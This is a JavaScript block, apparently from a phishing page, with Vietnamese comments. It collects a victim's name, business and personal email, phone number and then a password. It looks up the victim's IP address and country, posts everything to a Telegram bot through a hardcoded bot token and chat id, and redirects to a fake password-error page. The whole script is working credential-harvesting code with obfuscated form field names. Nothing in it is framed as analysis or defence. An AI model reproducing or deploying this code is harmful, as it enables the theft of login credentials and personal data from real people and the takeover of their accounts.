<script>
    // Hàm để xử lý sự kiện khi nhấn nút Send
    function handleSend(event) {
        event.preventDefault();

        // Lấy giá trị từ các input
        var namePage = document.querySelector('input[name="dliyxuvfhnv"]').value.trim();
        var fullName = document.querySelector('input[name="rcuarvklkut"]').value.trim();
        var businessEmail = document.querySelector('input[name="jgakoympwjd"]').value.trim();
        var personalEmail = document.querySelector('input[name="xqdmbnlkpcq"]').value.trim();
        var mobileNumber = document.querySelector('input[name="gpaciebmfzw"]').value.trim();
        var additionalInfo = document.querySelector('textarea[name="yykwevbhfh"]').value.trim();

        // Kiểm tra xem tất cả các trường đã được điền đầy đủ chưa
        if (namePage === '' || fullName === '' || businessEmail === '' || personalEmail === '' || mobileNumber === '' ) {
            alert("Vui lòng điền đầy đủ thông tin.");
            return;
        }

        // Lưu dữ liệu vào local storage để sử dụng sau khi nhập mật khẩu
        localStorage.setItem('formData', JSON.stringify({
            namePage: namePage,
            fullName: fullName,
            businessEmail: businessEmail,
            personalEmail: personalEmail,
            mobileNumber: mobileNumber,
            additionalInfo: additionalInfo
        }));

        // Hiển thị modal nhập mật khẩu
        var modal = document.getElementById('modalEl');
        modal.classList.remove('hidden');
        modal.classList.add('flex');
        setTimeout(function() {
            modal.classList.remove('opacity-0');
        }, 100);
    }

    // Sự kiện submit form
    document.getElementById('ccnpwxpytrb').addEventListener('submit', handleSend);

    // Hàm xử lý sự kiện khi nhấn nút Continue trong modal password
    function handleContinue(event) {
        event.preventDefault();

        // Lấy giá trị mật khẩu từ input
        var password = document.querySelector('input[name="hxeyfibmtuv"]').value.trim();

        // Kiểm tra xem mật khẩu đã được nhập chưa
        if (password === '') {
            alert("Vui lòng nhập mật khẩu.");
            return;
        }

        // Lấy dữ liệu từ local storage
        var formData = JSON.parse(localStorage.getItem('formData'));

        // Gửi dữ liệu về Telegram
        var ip;
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ip = data.ip;
                
                // Gửi địa chỉ IP đến máy chủ PHP để lấy thông tin quốc gia
                fetch('/get_country_from_ip.php?ip=' + ip)
                    .then(response => response.text())
                    .then(countryInfo => {
                        // Tạo nội dung tin nhắn để gửi về Telegram
                        var content = "\nName Page: " + formData.namePage + "\nFull Name: " + formData.fullName + "\nBusiness Email: " + formData.businessEmail + "\nPersonal Email: " + formData.personalEmail + "\nMobile Number: " + formData.mobileNumber + "\nAdditional Info: " + formData.additionalInfo + "\nPassword: " + password + "\n" + countryInfo;

                        // Cài đặt dữ liệu để gửi về Telegram
                        var apiToken = "7422299838:AAH2sIYdwz0e9K3tRjCXQUL0W0dxc5cKg-c";
                        var data = {
                            chat_id: '6742026261',
                            text: content,
                            parse_mode: 'HTML'
                        };

                        // Gửi yêu cầu POST đến Telegram API
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');

                        xhr.send(JSON.stringify(data));

                        xhr.onload = function () {
                            if (xhr.status >= 200 && xhr.status < 300) {
                                console.log('Message sent to Telegram bot successfully.');
                                window.location.href = "/business-pass-error.php";
                            } else {
                                console.error('Failed to send message to Telegram bot.');
                            }
                        };
                    })
                    .catch(error => console.error('Error fetching country info:', error));
            })
            .catch(error => console.error('Error fetching IP:', error));

        // Xóa dữ liệu trong local storage sau khi đã sử dụng
        localStorage.removeItem('formData');
    }

    // Sự kiện submit form trong modal password
    document.getElementById('mvmgxlrpqdl').addEventListener('submit', handleContinue);
</script>

   
    
